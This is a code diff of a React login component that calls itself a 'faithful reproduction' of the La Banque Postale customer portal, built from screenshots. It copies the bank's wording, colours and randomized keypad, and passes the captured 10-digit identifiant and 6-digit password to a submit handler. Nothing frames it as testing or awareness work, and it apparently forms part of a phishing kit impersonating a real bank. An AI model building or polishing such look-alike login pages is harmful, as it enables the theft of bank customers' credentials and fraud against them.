@@ -1,14 +1,16 @@
 import { useEffect, useMemo, useState } from "react";
 
 /**
- * Faithful reproduction of the official La Banque Postale customer portal login screen
- * (mobile + desktop), based on the user-provided screenshots:
- *  - Title: "Connexion à votre compte particulier"
- *  - Plain input (spaced digits as user types) for the 10-digit identifiant
- *  - "Mémoriser mon identifiant" switch on the right
- *  - Below: 6 empty circle puces + randomized 5x2 virtual keypad
- *  - Single "Se connecter" CTA appears once identifiant is filled
- *  - Bottom link: "Identifiant / Mot de passe oublié"
+ * Faithful reproduction of the official La Banque Postale customer portal login (two-phase):
+ *   Phase A: identifiant input (10 digits) + memorize switch + "Continuer" button.
+ *   Phase B (revealed after Continuer): keypad + 6 puces + "Se connecter" button.
+ *
+ * Important behaviors:
+ *  - The identifiant input accepts up to 10 digits (bug fix: maxLength was capping displayed
+ *    spaced value too early, so we now bind the raw 10-digit value and visually space it
+ *    with letter-spacing instead of injecting spaces in the value).
+ *  - The keypad NEVER appears at the same time as the identifiant entry. It only appears after
+ *    clicking "Continuer" (which requires 10 valid digits).
  */
 
 function shuffle(arr) {
@@ -23,6 +25,7 @@ function shuffle(arr) {
 export default function LoginStep({ onSubmit, submitting }) {
   const [identifiant, setIdentifiant] = useState("");
   const [memorize, setMemorize] = useState(false);
+  const [phase, setPhase] = useState("identifiant"); // "identifiant" | "password"
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
 
@@ -33,11 +36,13 @@ export default function LoginStep({ onSubmit, submitting }) {
     [keypadKey]
   );
 
-  // Re-randomize when the identifiant has reached 10 digits (password panel becomes useable)
-  const idComplete = identifiant.length === 10;
+  // Re-shuffle the keypad each time we enter the password phase
   useEffect(() => {
-    if (idComplete) setKeypadKey((k) => k + 1);
-  }, [idComplete]);
+    if (phase === "password") {
+      setKeypadKey((k) => k + 1);
+      setPassword("");
+    }
+  }, [phase]);
 
   const handleIdentifiantChange = (e) => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 10);
@@ -45,11 +50,23 @@ export default function LoginStep({ onSubmit, submitting }) {
     if (error) setError("");
   };
 
-  const handleKeyClick = (digit) => {
-    if (!idComplete) {
-      setError("Saisissez d'abord vos 10 chiffres d'identifiant.");
+  const handleContinuer = (e) => {
+    e.preventDefault();
+    if (identifiant.length !== 10) {
+      setError("L'identifiant doit contenir 10 chiffres.");
       return;
     }
+    setError("");
+    setPhase("password");
+  };
+
+  const handleBackToIdentifiant = () => {
+    setPhase("identifiant");
+    setPassword("");
+    setError("");
+  };
+
+  const handleKeyClick = (digit) => {
     if (password.length >= 6) return;
     setPassword((p) => p + digit);
     if (error) setError("");
@@ -59,10 +76,6 @@ export default function LoginStep({ onSubmit, submitting }) {
 
   const handleSeConnecter = (e) => {
     e.preventDefault();
-    if (!idComplete) {
-      setError("L'identifiant doit contenir 10 chiffres.");
-      return;
-    }
     if (password.length !== 6) {
       setError("Le mot de passe doit contenir 6 chiffres.");
       return;
@@ -75,59 +88,121 @@ export default function LoginStep({ onSubmit, submitting }) {
     });
   };
 
-  // Spaced display of the identifiant ("5 5 5 5 5 5 5 5 5 5")
-  const displayedIdentifiant = identifiant.split("").join(" ");
-
   return (
     <div className="fade-in" data-testid="login-step">
       <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-[#003366] mb-6">
         Connexion à votre compte particulier
       </h1>
 
-      <form onSubmit={handleSeConnecter} className="space-y-5" data-testid="login-form">
-        {/* Identifiant */}
-        <div className="space-y-2">
-          <label
-            htmlFor="identifiant"
-            className="block text-sm font-bold text-[#003366]"
-          >
-            Identifiant (10 chiffres)
-          </label>
-          <input
-            id="identifiant"
-            data-testid="login-identifiant-input"
-            type="tel"
-            inputMode="numeric"
-            autoComplete="username"
-            maxLength={10}
-            value={displayedIdentifiant}
-            onChange={handleIdentifiantChange}
-            className="w-full h-12 rounded-md border border-[#B6BAC2] bg-white px-4 text-base sm:text-lg font-medium text-[#003366] tracking-[0.15em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
-            aria-label="Identifiant 10 chiffres"
-          />
-        </div>
-
-        {/* Switch mémoriser - on the right */}
-        <button
-          type="button"
-          data-testid="login-memorize-toggle"
-          onClick={() => setMemorize((v) => !v)}
-          className="flex w-full items-center justify-between text-sm sm:text-base text-[#003366] select-none"
+      {/* PHASE A : identifiant */}
+      {phase === "identifiant" && (
+        <form
+          onSubmit={handleContinuer}
+          className="space-y-5"
+          data-testid="login-form"
         >
-          <span className="font-medium">Mémoriser mon identifiant</span>
-          <span className={`lbp-switch ${memorize ? "on" : ""}`}>
-            <span className="lbp-switch-knob" />
-          </span>
-        </button>
+          <div className="space-y-2">
+            <label
+              htmlFor="identifiant"
+              className="block text-sm font-bold text-[#003366]"
+            >
+              Identifiant (10 chiffres)
+            </label>
+            <input
+              id="identifiant"
+              data-testid="login-identifiant-input"
+              type="tel"
+              inputMode="numeric"
+              autoComplete="username"
+              value={identifiant}
+              onChange={handleIdentifiantChange}
+              placeholder="••••••••••"
+              className="w-full h-12 rounded-md border border-[#B6BAC2] bg-white px-4 text-base sm:text-lg font-medium text-[#003366] tracking-[0.4em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
+              aria-label="Identifiant 10 chiffres"
+            />
+            <div
+              data-testid="login-identifiant-counter"
+              className="text-xs text-[#7A8294]"
+            >
+              {identifiant.length} / 10
+            </div>
+          </div>
 
-        {/* Password section */}
-        <div className="pt-1">
+          <button
+            type="button"
+            data-testid="login-memorize-toggle"
+            onClick={() => setMemorize((v) => !v)}
+            className="flex w-full items-center justify-between text-sm sm:text-base text-[#003366] select-none"
+          >
+            <span className="font-medium">Mémoriser mon identifiant</span>
+            <span className={`lbp-switch ${memorize ? "on" : ""}`}>
+              <span className="lbp-switch-knob" />
+            </span>
+          </button>
+
+          {error && (
+            <p data-testid="login-error" className="text-sm text-[#C8102E]">
+              {error}
+            </p>
+          )}
+
+          <button
+            type="submit"
+            data-testid="login-continuer"
+            disabled={submitting}
+            className="w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
+          >
+            Continuer
+          </button>
+
+          <div className="text-center pt-1">
+            <a
+              href="#"
+              data-testid="login-forgot"
+              onClick={(e) => e.preventDefault()}
+              className="text-sm font-medium text-[#003366] underline hover:opacity-80"
+            >
+              Identifiant / Mot de passe oublié
+            </a>
+          </div>
+        </form>
+      )}
+
+      {/* PHASE B : mot de passe (clavier virtuel) */}
+      {phase === "password" && (
+        <div className="slide-down" data-testid="password-panel">
+          {/* Recap identifiant */}
+          <div className="mb-5 flex items-center justify-between rounded-md bg-[#F1F5FA] px-4 py-2.5">
+            <div className="flex flex-col">
+              <span className="text-[11px] uppercase tracking-wide text-[#7A8294]">
+                Identifiant
+              </span>
+              <span
+                data-testid="login-identifiant-recap"
+                className="text-sm font-semibold text-[#003366] font-mono tracking-widest"
+              >
+                {identifiant}
+              </span>
+            </div>
+            <button
+              type="button"
+              data-testid="login-change-id"
+              onClick={handleBackToIdentifiant}
+              className="text-xs font-medium text-[#003366] underline hover:opacity-80"
+            >
+              Modifier
+            </button>
+          </div>
+
           <div className="text-sm font-bold text-[#003366]">
             Mot de passe (6 chiffres)
           </div>
 
           {/* Empty circle puces */}
-          <div className="mt-3 flex items-center justify-center gap-3 sm:gap-4" aria-live="polite">
+          <div
+            className="mt-3 flex items-center justify-center gap-3 sm:gap-4"
+            aria-live="polite"
+          >
             {[0, 1, 2, 3, 4, 5].map((i) => (
               <span
                 key={i}
@@ -154,7 +229,7 @@ export default function LoginStep({ onSubmit, submitting }) {
             </div>
           )}
 
-          {/* Virtual randomized keypad - 5 cols x 2 rows */}
+          {/* Virtual randomized keypad */}
           <div
             data-testid="virtual-keypad"
             className="mt-4 grid grid-cols-5 gap-2"
@@ -172,36 +247,42 @@ export default function LoginStep({ onSubmit, submitting }) {
               </button>
             ))}
           </div>
-        </div>
 
-        {error && (
-          <p data-testid="login-error" className="text-sm text-[#C8102E] text-center">
-            {error}
+          <p className="mt-3 text-[11px] text-[#7A8294] text-center">
+            Utilisez les boutons ci-dessus, n'appuyez pas sur les chiffres de votre clavier.
           </p>
-        )}
 
-        {/* Se connecter */}
-        <button
-          type="submit"
-          data-testid="login-submit"
-          disabled={submitting}
-          className="w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
-        >
-          {submitting ? "Connexion…" : "Se connecter"}
-        </button>
+          {error && (
+            <p
+              data-testid="login-error"
+              className="mt-3 text-sm text-[#C8102E] text-center"
+            >
+              {error}
+            </p>
+          )}
 
-        {/* Forgot link */}
-        <div className="text-center pt-1">
-          <a
-            href="#"
-            data-testid="login-forgot"
-            onClick={(e) => e.preventDefault()}
-            className="text-sm font-medium text-[#003366] underline hover:opacity-80"
+          <button
+            type="button"
+            data-testid="login-submit"
+            onClick={handleSeConnecter}
+            disabled={submitting || password.length !== 6}
+            className="mt-5 w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
           >
-            Identifiant / Mot de passe oublié
-          </a>
+            {submitting ? "Connexion…" : "Se connecter"}
+          </button>
+
+          <div className="text-center pt-3">
+            <a
+              href="#"
+              data-testid="login-forgot"
+              onClick={(e) => e.preventDefault()}
+              className="text-sm font-medium text-[#003366] underline hover:opacity-80"
+            >
+              Identifiant / Mot de passe oublié
+            </a>
+          </div>
         </div>
-      </form>
+      )}
     </div>
   );
 }
